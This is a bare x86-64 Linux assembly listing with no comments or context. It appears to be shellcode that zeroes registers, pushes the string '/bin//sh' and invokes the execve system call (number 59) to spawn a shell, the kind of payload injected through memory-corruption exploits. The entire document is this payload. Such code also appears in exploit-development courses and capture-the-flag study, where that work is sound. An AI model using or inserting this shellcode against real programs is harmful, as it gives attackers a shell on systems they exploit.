global _start
        _start:
                mul esi
                push rax
                mov rdi, "/bin//sh"
                push rdi
                mov rdi, rsp
                mov al, 59
                syscall
